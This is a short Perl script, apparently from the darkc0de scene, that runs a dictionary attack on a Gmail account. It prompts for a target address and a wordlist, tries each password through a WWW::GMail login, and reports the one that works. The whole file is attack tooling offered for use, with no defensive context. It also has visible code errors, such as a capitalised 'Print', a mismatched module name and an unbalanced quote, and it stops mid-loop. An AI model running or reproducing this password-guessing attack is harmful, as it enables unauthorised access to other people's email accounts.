#!/usr/bin/perl
# c0dex by m0x.lk
# pGmail .-
system ("color f0");
system ("clear");
system ("cls");
print "\tc0dex by m0x.lk\n";
print "\n";
print "\t\t BrGmail .- RE & HaSe * darkc0de\n";
print "\n";
use LWP::UserAgent;
use HTTP::Cookies;
use WWW::Gmail;
sleep 1;
print "Usuario: \tEj. user@gmail.com";
$usuario=<STDIN>;
print "\n\n";
print "Diccionario: ";
$dict=<STDIN>;
print "\n\n";
$i = 1;
open (D,"<$dict") or die "Diccionario no encontrado\n";
while(<D>)
{
$try = $_;
    chomp $try;

Print "[+]Bruteando...\n";

      my $obj = WWW::GMail->new(
            username => "$usuario",
            password => "$try",
            cookies => {
                    autosave => 1,
                    file => "./gmail.cookie",
            },
      );
  
      my $ret = $obj->login();
      if ($ret == -1) {
                print $i++ . ": Fallo - $try\n";
        }
        else {
                print "'$try - $i intentos";
                last;